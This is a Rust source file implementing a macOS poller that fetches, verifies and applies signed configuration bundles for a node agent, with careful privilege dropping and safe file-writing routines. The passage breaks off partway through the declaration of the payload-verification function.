// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 PersonifAI LLC

//! `noo node fetch` — the macOS pull-rail poller.
//!
//! Linux nodes run `noo-fetch.sh` under a systemd timer. Macs had the pull
//! written INLINE into `noo enroll` (a 15-minute wait for the first bundle
//! and nothing afterwards), so a restage from the controller never reached
//! a Mac, and `noo enroll` could not exit like it does on Linux. This verb
//! is the same poller, native, run every minute by the `net.noomesh.fetch`
//! LaunchDaemon that enroll installs (root, so it can load the agent's
//! LaunchDaemon without a console session — the SSH/headless case).
//!
//! Adaptive cadence: while `<home>/noomesh/expect-bundle` exists (enroll
//! writes it, a successful apply removes it) every tick polls; otherwise
//! only every fifth tick (5 min), which is why `noo cluster provision
//! --wait` allows six.

use crate::{Globals, Unhandled};
use std::path::{Path, PathBuf};
use std::process::Command;

pub(crate) const FETCH_LABEL: &str = "net.noomesh.fetch";
pub(crate) const AGENT_LABEL: &str = "net.noomesh.node-agent";
/// The harness LaunchDaemon; loaded/unloaded by the agent per placement.
const HARNESS_LABEL: &str = "net.noomesh.harness";

/// Every external command the applier runs, by absolute system path: a bare
/// name resolves through PATH, which a manual `sudo noo node fetch` inherits
/// from the caller (H2 third review). Homebrew prefixes are never on it.
const OPENSSL: &str = "/usr/bin/openssl";
/// Unwraps a gzip-compressed bundle (controller >= 0.6.5 compresses before
/// encrypting). Absent or failing: the apply reports why and applies nothing.
const GZIP: &str = "/usr/bin/gzip";
const LAUNCHCTL: &str = "/bin/launchctl";
const ID: &str = "/usr/bin/id";
const SH: &str = "/bin/sh";
const SUDO: &str = "/usr/bin/sudo";
const ENV: &str = "/usr/bin/env";
/// The only PATH a child of the applier sees.
const SAFE_PATH: &str = "/usr/bin:/bin:/usr/sbin:/sbin";
/// Root's copy of the CLI (the fetch daemon's program) and the helper.
const NOO_ROOT_BIN: &str = "/usr/local/bin/noo";
const HOSTD_BIN: &str = "/usr/local/bin/noo-hostd";

fn run(cmd: &mut Command) -> (i32, String) {
    // External commands here are the root half of the apply (launchctl,
    // openssl over the root stage): they run with root restored, a cleared
    // environment and a fixed PATH. File work in THIS process runs as the
    // user (privs); a child that acts for the user goes through
    // `lowered_output`, which drops it completely.
    let _root = privs::root();
    output_text(cmd.env_clear().env("PATH", SAFE_PATH).output())
}

fn output_text(o: std::io::Result<std::process::Output>) -> (i32, String) {
    match o {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).to_string();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            (o.status.code().unwrap_or(-1), s.trim().to_string())
        }
        Err(e) => (-1, e.to_string()),
    }
}

/// Run a child AS THE USER: real, effective and saved uid all the user's, so
/// it cannot `setuid(0)` back (a child forked while merely lowered keeps real
/// uid 0 and could). Root is resumed only for the spawn itself, which is what
/// lets the child's `setgid`/`setgroups`/`setuid` succeed. Not lowered (an
/// unprivileged run): an ordinary child.
fn lowered_output(cmd: &mut Command) -> std::io::Result<std::process::Output> {
    use std::os::unix::process::CommandExt;
    cmd.env_clear().env("PATH", SAFE_PATH);
    match privs::lowered_ids() {
        Some((uid, gid)) => {
            let _r = privs::root();
            cmd.uid(uid).gid(gid).output()
        }
        None => cmd.output(),
    }
}

/// The Mac root applier runs AS THE USER by default
/// review, H2). `noo node fetch` is started as root by launchd, but almost
/// everything it touches is the user's own `~/noomesh` tree, which the user's
/// agent can rewrite at will — so a root write there could be steered by a
/// symlink or hardlink into any file on the box, and a root read could leak
/// one. `drop_to` lowers the EFFECTIVE uid/gid/groups to the user's at the
/// start of the poll (the real uid stays 0, so root can be resumed);
/// `root()` resumes root for one scope and lowers it again on drop. Default
/// deny: a write nobody wrapped runs as the user and, at worst, fails.
pub(crate) mod privs {
    use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};

    static DROPPED: AtomicBool = AtomicBool::new(false);
    static UID: AtomicU32 = AtomicU32::new(0);
    static GID: AtomicU32 = AtomicU32::new(0);

    /// `user`'s (uid, primary gid) from the password database.
    pub(crate) fn lookup(user: &str) -> Option<(u32, u32)> {
        let c = std::ffi::CString::new(user).ok()?;
        let pw = unsafe { libc::getpwnam(c.as_ptr()) };
        if pw.is_null() {
            return None;
        }
        Some(unsafe { ((*pw).pw_uid, (*pw).pw_gid) })
    }

    /// Lower to `user` if this process is root; a no-op otherwise.
    pub(crate) fn drop_to(user: &str) -> Result<(), String> {
        if unsafe { libc::getuid() } != 0 || DROPPED.load(Ordering::SeqCst) {
            return Ok(());
        }
        let Some((uid, gid)) = lookup(user) else {
            return Err(format!("no such user '{user}'"));
        };
        if uid == 0 {
            return Err("refusing to run the user half of the apply as root".into());
        }
        UID.store(uid, Ordering::SeqCst);
        GID.store(gid, Ordering::SeqCst);
        lower()?;
        DROPPED.store(true, Ordering::SeqCst);
        Ok(())
    }

    /// The (uid, gid) the poll was lowered to, once it has been.
    pub(crate) fn lowered_ids() -> Option<(u32, u32)> {
        DROPPED
            .load(Ordering::SeqCst)
            .then(|| (UID.load(Ordering::SeqCst), GID.load(Ordering::SeqCst)))
    }

    fn lower() -> Result<(), String> {
        let (uid, gid) = (UID.load(Ordering::SeqCst), GID.load(Ordering::SeqCst));
        let g = gid as libc::gid_t;
        unsafe {
            if libc::setgroups(1 as _, &g) != 0 || libc::setegid(g) != 0 || libc::seteuid(uid as libc::uid_t) != 0 {
                return Err(format!("could not drop to uid {uid}: {}", std::io::Error::last_os_error()));
            }
        }
        Ok(())
    }

    fn raise() -> Result<(), String> {
        let zero: libc::gid_t = 0;
        unsafe {
            if libc::seteuid(0) != 0 || libc::setegid(0) != 0 || libc::setgroups(1 as _, &zero) != 0 {
                return Err(format!("could not resume root: {}", std::io::Error::last_os_error()));
            }
        }
        Ok(())
    }

    /// Root for the life of the guard (nested guards are no-ops).
    #[must_use]
    pub(crate) struct Root(bool);

    pub(crate) fn root() -> Root {
        if DROPPED.load(Ordering::SeqCst) && unsafe { libc::geteuid() } != 0 {
            if let Err(e) = raise() {
                eprintln!("noo node fetch: {e}");
                std::process::exit(70);
            }
            Root(true)
        } else {
            Root(false)
        }
    }

    impl Drop for Root {
        fn drop(&mut self) {
            if self.0 {
                if let Err(e) = lower() {
                    // Staying root with the user's tree ahead is the one
                    // outcome this module exists to prevent.
                    eprintln!("noo node fetch: {e} — stopping");
                    std::process::exit(70);
                }
            }
        }
    }

    /// Is the PROCESS root (real uid), whatever the effective uid is now.
    pub(crate) fn is_root_process() -> bool {
        unsafe { libc::getuid() == 0 }
    }
}

/// Write `bytes` to a root-owned path (`/usr/local/bin`, `/Library/...`, the
/// anchor and state dirs) with root resumed, through a temp file and a
/// rename. Refused unless the destination's directory and ITS parent are
/// root-owned plain directories nobody else can write (H2 third review, M4):
/// a Homebrew-owned `/usr/local/bin` would let the user swap the file root
/// later executes, so root does not install there at all.
fn root_install(bytes: &[u8], dst: &Path, mode: u32) -> Result<(), String> {
    let _r = privs::root();
    let as_root = privs::is_root_process();
    // An unprivileged run (enroll's own first apply, a developer's test) is
    // not root: nothing it writes can become root's, so there is no owner to
    // demand.
    let trusted = |p: &Path| if as_root { root_dir_trustworthy(p) } else { Ok(()) };
    root_install_with(bytes, dst, mode, &trusted, unsafe { libc::geteuid() } == 0)
}

/// `root_install` with the directory check injected (tests stand in their
/// own uid for root) and the root `fchown` switchable.
fn root_install_with(
    bytes: &[u8],
    dst: &Path,
    mode: u32,
    trusted: &dyn Fn(&Path) -> Result<(), String>,
    chown_root: bool,
) -> Result<(), String> {
    let parent = dst
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .ok_or_else(|| format!("{}: no parent directory", dst.display()))?;
    if let Some(gp) = parent.parent().filter(|p| !p.as_os_str().is_empty()) {
        trusted(gp)?;
    }
    trusted(parent)?;
    let name = dst.file_name().ok_or_else(|| format!("{}: no file name", dst.display()))?;
    let next = parent.join(format!(".{}.noo-next", name.to_string_lossy()));
    write_new_file(&next, bytes, mode, chown_root).map_err(|e| format!("{}: {e}", dst.display()))?;
    std::fs::rename(&next, dst).map_err(|e| {
        let _ = std::fs::remove_file(&next);
        format!("{}: {e}", dst.display())
    })
}

/// Create `p` afresh — never through a symlink or onto a file someone left
/// there (a leftover is unlinked, which does not follow it) — with `mode`
/// from the moment it exists, and (as root) owned root:wheel by descriptor.
fn write_new_file(p: &Path, bytes: &[u8], mode: u32, chown_root: bool) -> std::io::Result<()> {
    use std::io::Write as _;
    use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
    let _ = std::fs::remove_file(p);
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(mode)
        .custom_flags(libc::O_NOFOLLOW)
        .open(p)?;
    f.write_all(bytes)?;
    f.set_permissions(std::fs::Permissions::from_mode(mode))?;
    if chown_root {
        std::os::unix::fs::fchown(&f, Some(0), Some(0))?;
    }
    Ok(())
}

/// Write one file of the user's tree, AS THE USER: a temp file beside it and
/// a rename, so a file left root-owned by an older applier is replaced
/// rather than written through, and a running binary is never truncated.
fn user_write(dst: &Path, bytes: &[u8], mode: u32) -> Result<(), String> {
    let parent = dst.parent().unwrap_or(Path::new("."));
    let name = dst.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let next = parent.join(format!(".{name}.noo-next"));
    write_new_file(&next, bytes, mode, false).map_err(|e| format!("{}: {e}", dst.display()))?;
    std::fs::rename(&next, dst).map_err(|e| {
        let _ = std::fs::remove_file(&next);
        format!("{}: {e}", dst.display())
    })
}

fn read_trim(p: &Path) -> Option<String> {
    std::fs::read_to_string(p).ok().map(|s| s.trim().to_string()).filter(|s| !s.is_empty())
}

/// Where a pre-#383 per-user harness would still be: its gui-domain launchd
/// target and its LaunchAgents plist. Pure, so the label and domain string
/// are pinned — `gui/<uid>/<label>` is what `launchctl bootout` wants, not
/// the plist path and not `user/<uid>`.
fn stale_user_harness(user: &str, uid: &str) -> (String, String) {
    (
        format!("gui/{uid}/{HARNESS_LABEL}"),
        format!("/Users/{user}/Library/LaunchAgents/{HARNESS_LABEL}.plist"),
    )
}

/// The user's (uid, gid): the ids the poll was lowered to, or the password
/// database's. Never a guess — `id -u` failing used to mean uid 501.
fn user_ids(user: &str) -> Option<(u32, u32)> {
    privs::lowered_ids().or_else(|| privs::lookup(user))
}

/// Where the first pass leaves the bundle for the re-exec pass.
fn reexec_bundle_path(state: &Path) -> PathBuf {
    // `state` is ROOT_STATE_DIR in the poller: root's own directory, never
    // the user's tree (H2).
    state.join("reexec-bundle.bin")
}

/// Root-only state of the fetch daemon (the re-exec handover, the stage,
/// the last-applied bundle hash).
const ROOT_STATE_DIR: &str = "/Library/Application Support/noomesh/state";

/// The last bundle this node applied. Root's copy lives in ROOT_STATE_DIR:
/// in the user's tree the user could delete or rewrite it and re-arm an
/// apply of a bundle already applied (H2 third review).
fn last_bundle_path(base: &Path, as_root: bool) -> PathBuf {
    if as_root {
        Path::new(ROOT_STATE_DIR).join("last-bundle.sha256")
    } else {
        base.join("last-bundle.sha256")
    }
}

/// `state` exists as root's own 0700 directory, under a parent nobody but
/// root can write. Checked before AND after creation (a check of an absent
/// path proves nothing about what gets created there).
fn ensure_root_state_dir(state: &Path) -> Result<(), String> {
    use std::os::unix::fs::{DirBuilderExt, PermissionsExt};
    let _r = privs::root();
    let check = privs::is_root_process();
    let parent = state.parent().filter(|p| !p.as_os_str().is_empty());
    let verify = || -> Result<(), String> {
        if check {
            if let Some(p) = parent {
                root_dir_trustworthy(p)?;
            }
            root_dir_trustworthy(state)?;
        }
        Ok(())
    };
    verify()?;
    if let Some(p) = parent {
        std::fs::DirBuilder::new()
            .recursive(true)
            .mode(0o755)
            .create(p)
            .map_err(|e| format!("{}: {e}", p.display()))?;
    }
    std::fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(state)
        .map_err(|e| format!("{}: {e}", state.display()))?;
    let _ = std::fs::set_permissions(state, std::fs::Permissions::from_mode(0o700));
    verify()
}

/// Hand the staged blob to the CLI that is about to re-run this apply.
/// Root-only: it is the same ciphertext the controller served, but it
/// stays on disk between two processes and nobody else needs it.
fn leave_reexec_bundle(state: &Path, blob: &[u8]) -> Result<(), String> {
    ensure_root_state_dir(state)?;
    root_install(blob, &reexec_bundle_path(state), 0o600)
}

/// On the re-exec pass, the bundle the first pass left — consumed, so a
/// later ordinary tick never re-applies it. On any other pass, `None`, and
/// a leftover file (a re-exec that never ran) is cleared rather than
/// applied out of band.
fn take_reexec_bundle(state: &Path, reexec_pass: bool) -> Option<Vec<u8>> {
    let _r = privs::root();
    if privs::is_root_process() && root_dir_trustworthy(state).is_err() {
        return None;
    }
    let p = reexec_bundle_path(state);
    if !p.is_file() {
        return None;
    }
    let blob = std::fs::read(&p).ok();
    let _ = std::fs::remove_file(&p);
    if reexec_pass { blob.filter(|b| !b.is_empty()) } else { None }
}

/// The verified payloads of a bundle, by kind: read from root's stage
/// while it was root's alone. Every later decision and every byte installed
/// comes from here, never from a path the user can write (H2 third review,
/// H1 — a user stage re-read after root was dropped was a TOCTOU).
type Payloads = std::collections::BTreeMap<String, Vec<u8>>;

/// What a verified bundle asks of this node, decided from the payloads
/// alone. Pure, so a test can show that nothing on disk moves it.
#[derive(Debug, PartialEq)]
enum ApplyBranch {
    /// A signed teardown: `names` is line 1 (must be this box), then the
    /// directive.
    Teardown { names: String, purge_data: bool },
    /// A signing-key rollover: `signing-pub` and no agent-env.
    Rollover,
    /// `host-telemetry` alone.
    HostTelemetry,
    /// `fleet-secrets` alone: a credential merge.
    FleetSecrets,
    /// A provisioning: the full install chain.
    Full,
}

fn apply_branch(payloads: &Payloads) -> ApplyBranch {
    // A signed `teardown` kind (parity with noo-apply.sh §teardown): line 1
    // is the node name and must be THIS box — a teardown for node A cannot
    // be replayed to destroy node B; line 2 carries the directives. Before
    // An earlier release this kind passed the gate and fell through to the
    // full-install chain, which failed on the missing payloads AFTER the
    // controller had already seen the bundle collected — host6 reported
    // "collected" and kept heartbeating (2026-09-07).
    if let Some(td) = payloads.get("teardown") {
        let td = String::from_utf8_lossy(td);
        let mut lines = td.lines().map(str::trim);
        let names = lines.next().unwrap_or("").to_string();
        let directive = lines.next().unwrap_or("");
        let purge_data = directive.contains("purge-data") || directive.contains("factory");
        return ApplyBranch::Teardown { names, purge_data };
    }
    let has = |k: &str| payloads.contains_key(k);
    // `agent-env` in the same bundle means a full provisioning that already
    // carries these values, so each single-purpose kind falls through to it.
    //
    // A signing-key ROLLOVER bundle carries `signing-pub` (and the Linux
    // applier, which a Mac has no use for) and nothing else. The full-install
    // chain demands all six payloads, so it would fail a rollover. Install
    // the key, restart nothing: only the verifier reads it.
    if has("signing-pub") && !has("agent-env") {
        return ApplyBranch::Rollover;
    }
    // A host-telemetry bundle (`noo cluster host-telemetry apply`) carries ONE
    // file: switch off the brew tailscaled's log upload, no agent install.
    if has("host-telemetry") && !has("agent-env") {
        return ApplyBranch::HostTelemetry;
    }
    // A fleet-secrets bundle carries ONE file and installs no agent: it is a
    // credential merge, not a provisioning — take this path and hand the
    // agent a restart.
    if has("fleet-secrets") && !has("agent-env") {
        return ApplyBranch::FleetSecrets;
    }
    ApplyBranch::Full
}

/// The user's copies of the trust anchors and the enroll-time pin, read AS
/// THE USER into memory — root never opens them (H2 third review, L5).
#[derive(Default)]
struct UserAnchors {
    ca: Option<Vec<u8>>,
    signing: Option<Vec<u8>>,
    pin: Option<String>,
}

fn read_user_anchors(base: &Path) -> UserAnchors {
    UserAnchors {
        ca: std::fs::read(base.join("pki/ca.crt")).ok(),
        signing: std::fs::read(base.join("pki/signing.pub")).ok(),
        pin: read_trim(&base.join("ca.sha256")),
    }
}

/// Copy the bundle's files into `<base>` and load the agent LaunchDaemon.
/// Runs as root under launchd (lowered to `user` for the user's tree) or as
/// the user from a manual run (then the daemon load needs sudo). `me` is this
/// box's own name, read by the caller as the user.
pub(crate) fn darwin_apply(blob: &[u8], base: &Path, user: &str, me: &str, as_root: bool) -> Result<(), String> {
    // The user's files this apply needs, read AS THE USER into memory before
    // root is resumed: root never opens a path in the user's tree.
    let key = std::fs::read(base.join("birth.key"))
        .map_err(|_| format!("birth key missing at {} — re-run enroll", base.join("birth.key").display()))?;
    let user_anchors = if as_root { read_user_anchors(base) } else { UserAnchors::default() };
    // The trust decision runs as root, in a stage only root can touch: the
    // decrypt, the extraction, the anchors and the verification (H2).
    let root_guard = privs::root();
    let stage = private_stage_dir("noo-darwin-apply")?;
    let payloads = match verified_payloads(blob, &key, &stage, base, me, as_root, &user_anchors) {
        Ok(p) => p,
        Err(e) => {
            let _ = std::fs::remove_dir_all(&stage);
            return Err(e);
        }
    };
    let _ = std::fs::remove_dir_all(&stage);
    drop(root_guard);
    // From here the bundle is `payloads` (verified, in memory). Nothing is
    // re-read from disk to decide what to do or what to install.
    let anchors = if as_root { PathBuf::from(ROOT_ANCHOR_DIR) } else { base.join("pki") };
    for d in ["bin", "pki"] {
        let _ = std::fs::create_dir_all(base.join(d));
    }
    // An anchor goes to the root-owned dir as root (from the verified bytes),
    // or — on an unprivileged run — to the user's pki.
    let install_anchor = |kind: &str, name: &str| -> Result<(), String> {
        let Some(b) = payloads.get(kind) else { return Ok(()) };
        if as_root {
            root_install(b, &anchors.join(name), 0o644)
        } else {
            user_write(&anchors.join(name), b, 0o644).map_err(|e| format!("install {name}: {e}"))
        }
    };
    let launchctl_cmd = || -> Command {
        let mut c = Command::new(if as_root { LAUNCHCTL } else { SUDO });
        if !as_root {
            c.arg(LAUNCHCTL);
        }
        c
    };
    match apply_branch(&payloads) {
        ApplyBranch::Teardown { names, purge_data } => {
            if !names.is_empty() && names != me {
                return Err(format!("teardown names '{names}' but this node is '{me}' — refusing"));
            }
            darwin_dismantle(base, as_root, purge_data);
            return Err(TEARDOWN.into());
        }
        ApplyBranch::Rollover => return install_anchor("signing-pub", "signing.pub"),
        ApplyBranch::HostTelemetry => {
            let body = String::from_utf8_lossy(&payloads["host-telemetry"]).into_owned();
            host_telemetry_binding(&body, me)?;
            return host_telemetry_darwin(user, as_root);
        }
        ApplyBranch::FleetSecrets => {
            let body = String::from_utf8_lossy(&payloads["fleet-secrets"]).into_owned();
            merge_fleet_secrets(&body, &base.join("agent.env"), me)?;
            agent_secrets_to_files(base, user, as_root)?;
            let _ = run(launchctl_cmd().args(["kickstart", "-k", &format!("system/{AGENT_LABEL}")]));
            return Ok(());
        }
        ApplyBranch::Full => {}
    }
    // The user's tree, as the user, from the verified bytes.
    let inst = |kind: &str, dst: PathBuf, mode: u32| -> bool {
        payloads.get(kind).is_some_and(|b| user_write(&dst, b, mode).is_ok())
    };
    // A binary kind: skipped (and reported `=unchanged`) when the node already
    // holds exactly these bytes at that mode; installed otherwise. A missing
    // or unreadable installed file is the install path, never the skip path.
    let inst_bin = |kind: &str, dst: PathBuf, mode: u32| -> bool {
        match payloads.get(kind) {
            Some(b) if installed_matches(&dst, b, mode) => {
                crate::ui::done(&format!("noo node fetch: {kind} unchanged — already the bytes this node runs, not rewritten"));
                note_binary(kind, true, payloads.get(kind).map_or(&[][..], |b| b.as_slice()));
                true
            }
            _ => {
                let ok = inst(kind, dst, mode);
                if ok { note_binary(kind, false, payloads.get(kind).map_or(&[][..], |b| b.as_slice())); }
                ok
            }
        }
    };
    let text = |kind: &str| payloads.get(kind).map(|b| String::from_utf8_lossy(b).into_owned());
    let daemon_plist = format!("/Library/LaunchDaemons/{AGENT_LABEL}.plist");
    // What the agent loads, before this apply touches any of it.
    let inputs_before = agent_inputs_fingerprint(base, Path::new(&daemon_plist));
    // signing-pub rides with the certs: a public key, 644 like ca.crt, and
    // installing it is what moves this node off the CA-signed lane. It is
    // optional, so it is NOT part of `all_ok` — a bundle without one is a
    // pre-split bundle, not a broken one.
    let _ = install_anchor("signing-pub", "signing.pub");
    // The agent's own TLS copy under ~/noomesh/pki (below, as the user), and
    // — as root — the anchor the next apply verifies against.
    if as_root {
        let _ = install_anchor("ca.crt", "ca.crt");
    }
    let all_ok = inst("ca.crt", base.join("pki/ca.crt"), 0o644)
        && inst("node.crt", base.join("pki/node.crt"), 0o644)
        && inst("node.key", base.join("pki/node.key"), 0o600)
        && inst("agent-env", base.join("agent.env"), 0o600)
        && inst("run-agent", base.join("run-agent.sh"), 0o700)
        && inst_bin("agent-binary", base.join("bin/noo-node-agent"), 0o755);
    // The node's own NATS pair rides beside agent-env and is
    // merged into it AFTER the whole-file write, so the rendered env (which
    // carries only the shared pair) does not overwrite it. Same shape as the
    // Linux applier's merge. A bundle without it leaves the agent on the
    // shared user, which the gateway now refuses (2026-09-12).
    let creds_ok = match text("nats-creds") {
        Some(body) => match merge_nats_creds(&body, &base.join("agent.env"), me) {
            Ok(()) => { crate::ui::done("noo node fetch: node NATS credential merged into agent.env"); true }
            Err(e) => { crate::ui::warned(&format!("nats-creds not merged: {e}")); false }
        },
        None => true, // not carried: an older controller; the agent stays on whatever it has
    };
    let all_ok = all_ok && creds_ok;
    // The backend door leaves, under the agent's
    // NOO_PKI_DIR (~/noomesh/pki). Optional — a bundle from an older
    // controller carries none — but a pair that IS carried and cannot be
    // installed fails the apply: the agent would refuse that backend.
    let leaves_ok = match install_service_leaves(&payloads, &base.join("pki")) {
        Ok(done) => {
            if !done.is_empty() {
                crate::ui::done(&format!("noo node fetch: backend door leaves installed ({})", done.join(", ")));
            }
            true
        }
        Err(e) => { crate::ui::warned(&format!("backend door leaves not installed: {e}")); false }
    };
    let all_ok = all_ok && leaves_ok;
    // Last env write of this apply (the merges above wrote plain lines, and
    // the agent binary is installed).
    let all_ok = all_ok && agent_secrets_to_files(base, user, as_root)
        .map_err(|e| crate::ui::warned(&format!("agent secrets not moved to files: {e}")))
        .is_ok();
    // The harness rides beside the agent under ~/noomesh: the
    // gateway binary, its env (merged with the NATS pair below when one is
    // carried), a runner that sources the env, and a LaunchDaemon. All
    // optional — a bundle without them is a pre-52 bundle, not a broken one.
    let _ = inst_bin("harness-binary", base.join("bin/noo-gateway"), 0o755);
    if inst("harness-env", base.join("harness.env"), 0o600) {
        if let Some(body) = text("nats-creds") {
            if let Err(e) = merge_nats_creds(&body, &base.join("harness.env"), me) {
                crate::ui::warned(&format!("nats-creds not merged into harness.env: {e}"));
            }
        }
    }
    let _ = inst("run-harness", base.join("run-harness.sh"), 0o700);
    // The harness env's secrets, judged by the installed gateway binary's
    // own marker — after both the env and the binary above.
    if let Err(e) = super::agent_secret_files::converge_harness(
        &base.join("harness.env"),
        &base.join("harness-secrets"),
        &base.join("bin/noo-gateway"),
    ) {
        crate::ui::warned(&format!("harness secrets not moved to files: {e}"));
    }
    // The privileged helper (noo-hostd) — Darwin worker mode. Root only, so
    // only when this applier runs as root (it does, under launchd). The
    // daemon installs itself as a system LaunchDaemon and is what starts
    // and stops the harness; without it the harness below is installed and
    // unmanageable, because the agent runs as the user and cannot reach the
    // system domain (host6, 2026-09-22). Mirrors noo-apply.sh: keep .prev,
    // install, let the binary install its own daemon, then require a FRESH
    // heartbeat advertising the op we need — i.e. the NEW daemon is the one
    // running — restoring .prev on failure.
    if let (true, Some(hostd_bytes)) = (as_root, payloads.get("hostd-binary")) {
        if installed_matches(Path::new(HOSTD_BIN), hostd_bytes, 0o755) {
            // Same bytes as the running helper: no swap, no `install` (which
            // restarts its daemon), no heartbeat wait. Absent or unreadable
            // is not a match, so a first install takes the path below.
            crate::ui::done("noo node fetch: hostd-binary unchanged — noo-hostd already runs these bytes, not touched");
            note_binary("hostd-binary", true, hostd_bytes);
        } else if install_hostd(hostd_bytes) {
            note_binary("hostd-binary", false, hostd_bytes);
        }
    }
    // The agent's state directory is root's again, and its working
    // subdirectories the user's, on EVERY root apply — not only when a hostd
    // was carried and installed: a bundle without one, or a refused one,
    // would otherwise leave /var/lib/noo-node-agent as an older applier left
    // it (the user's). After hostd, whose `install` creates the spool.
    if as_root {
        reclaim_agent_dirs(user);
    }
    if let Some(b) = payloads.get("harness-plist") {
        // Installed, not loaded: the agent loads it when a placement says so
        // Launchctl load/unload of this
        // label is the darwin equivalent of the Linux sudoers grant.
        if as_root {
            // root_install writes it root:wheel by descriptor. launchd
            // answers `bootstrap system` with "Bootstrap failed: 5:
            // Input/output error" for a daemon plist that is not root:wheel
            // and for a label still loaded in the user's gui domain (the
            // pre-#383 per-user LaunchAgent hostsvc used to `launchctl load
            // -w`; nothing booted it out). Both are what a correct install
            // looks like anyway, both are idempotent, so both run on every
            // apply and an existing box heals on its next restage (host6,
            // 2026-09-22).
            let dst = PathBuf::from(format!("/Library/LaunchDaemons/{HARNESS_LABEL}.plist"));
            if let Err(e) = root_install(b, &dst, 0o644) {
                crate::ui::warned(&format!("harness plist not installed: {e}"));
            }
            if let Some((uid, _)) = user_ids(user) {
                let (gui_target, agent_plist) = stale_user_harness(user, &uid.to_string());
                let _ = run(Command::new(LAUNCHCTL).args(["bootout", &gui_target]));
                let _ = std::fs::remove_file(&agent_plist);
            }
        } else {
            let dst = PathBuf::from(format!("/Users/{user}/Library/LaunchAgents/{HARNESS_LABEL}.plist"));
            let _ = user_write(&dst, b, 0o644);
        }
    }
    // The CLI rides the rail: root-owned copy for the fetch daemon, and the
    // user's own under ~/.local/bin.
    let cli_unchanged = payloads.get("cli-binary").filter(|b| !b.is_empty()).is_some_and(|cli| {
        // Both copies must already be these bytes: the user's under
        // ~/.local/bin and, when root applies, root's for the fetch daemon.
        installed_matches(&PathBuf::from(format!("/Users/{user}/.local/bin/noo")), cli, 0o755)
            && (!as_root || installed_matches(Path::new(NOO_ROOT_BIN), cli, 0o755))
    });
    if cli_unchanged {
        crate::ui::done("noo node fetch: cli-binary unchanged — the CLI already is these bytes, not rewritten");
        if let Some(c) = payloads.get("cli-binary") { note_binary("cli-binary", true, c); }
    } else if let Some(cli) = payloads.get("cli-binary").filter(|b| !b.is_empty()) {
        // The user's copy as the user (no root chmod/chown into the user's
        // tree, H2); root's copy from the verified bytes.
        let user_bin = PathBuf::from(format!("/Users/{user}/.local/bin"));
        let _ = std::fs::create_dir_all(&user_bin);
        if let Err(e) = user_write(&user_bin.join("noo"), cli, 0o755) {
            crate::ui::warned(&format!("noo node fetch: the user's CLI ({}) was not updated: {e}", user_bin.join("noo").display()));
        }
        let root_ok = as_root && match root_install(cli, Path::new(NOO_ROOT_BIN), 0o755) {
            Ok(()) => true,
            Err(e) => {
                crate::ui::warned(&format!("root CLI not updated: {e}"));
                note_root_refused("noo-cli");
                false
            }
        };
        if root_ok || !as_root {
            note_binary("cli-binary", false, cli);
        }
        if root_ok {
            crate::ui::done("noo node fetch: CLI updated from the bundle");
        } else if !as_root {
            crate::ui::done("noo node fetch: the user's CLI updated from the bundle (root's copy is the daemon's to install)");
        }
        // The rest of this apply (plist load, agent restart) should run
        // under the CLI that just arrived, not the one that fetched it:
        // a fix shipped in the bundle otherwise applies only on the NEXT
        // restage (host6, 2026-09-03). Signal the poller to re-exec — only
        // when root's copy really is the new one.
        if root_ok && std::env::var("NOO_FETCH_REEXEC").is_err() {
            let running = std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok()).map(|b| {
                use sha2::{Digest, Sha256}; hex::encode(Sha256::digest(&b)) });
            let new = { use sha2::{Digest, Sha256}; hex::encode(Sha256::digest(cli)) };
            if running.as_deref() != Some(new.as_str()) {
                return Err(REEXEC.into());
            }
        }
    }
    let plist_ok = match payloads.get("agent-plist") {
        None => false,
        Some(b) if as_root => root_install(b, Path::new(&daemon_plist), 0o644).is_ok(),
        Some(b) => {
            // Unprivileged: the user's own bytes, installed by sudo.
            let tmp = base.join(".agent-plist.noo-next");
            let ok = user_write(&tmp, b, 0o644).is_ok()
                && run(Command::new(SUDO).args(["install", "-m", "644", "-o", "root", "-g", "wheel", &tmp.to_string_lossy(), &daemon_plist])).0 == 0;
            let _ = std::fs::remove_file(&tmp);
            ok
        }
    };
    if !all_ok || !plist_ok {
        return Err("bundle apply incomplete (a file was missing or unwritable)".into());
    }
    // No `chown -R` of ~/noomesh any more: everything above was written as
    // the user, and a recursive root chown of a user-writable tree would
    // follow a planted hardlink to any root file (H2).
    // (Re)load the agent as a LaunchDaemon in the SYSTEM domain: runs at
    // boot, no console login needed (a LaunchAgent cannot be loaded from an
    // SSH session at all — host6, 2026-09-02).
    let launchctl = |args: &[&str]| -> (i32, String) { run(launchctl_cmd().args(args)) };
    let target = format!("system/{AGENT_LABEL}");
    // Nothing the agent loads changed (a restage of bytes it already runs):
    // restarting it would only drop its connections. Only on proof — equal
    // digests AND the daemon is loaded now; otherwise the full reload below.
    let inputs_after = agent_inputs_fingerprint(base, Path::new(&daemon_plist));
    if inputs_before == inputs_after && launchctl(&["print", &target]).0 == 0 {
        crate::ui::done("noo node fetch: nothing the agent loads changed — agent left running, not restarted");
        return Ok(());
    }
    let _ = launchctl(&["bootout", &target]);
    // bootout is asynchronous: a bootstrap issued while the old instance is
    // still tearing down fails with "Bootstrap failed: 5: Input/output
    // error" (host6, 2026-09-03). Wait for the label to disappear, then
    // retry the load a few times.
    for _ in 0..15 {
        if launchctl(&["print", &target]).0 != 0 { break; }
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
    let mut last = String::new();
    let mut loaded = false;
    for attempt in 0..5 {
        let (c, o) = launchctl(&["bootstrap", "system", &daemon_plist]);
        if c == 0 || o.contains("already") {
            loaded = true;
            break;
        }
        last = o;
        if attempt < 4 { std::thread::sleep(std::time::Duration::from_secs(2)); }
    }
    if !loaded {
        return Err(format!("launchctl bootstrap system failed after 5 attempts: {last}"));
    }
    let _ = launchctl(&["kickstart", "-k", &target]);
    Ok(())
}

/// The root half of `darwin_apply`, in root's stage: decrypt with the key
/// bytes the user half read, extract, take the anchors, verify, and read
/// every verified payload into memory.
fn verified_payloads(
    blob: &[u8],
    key: &[u8],
    stage: &Path,
    base: &Path,
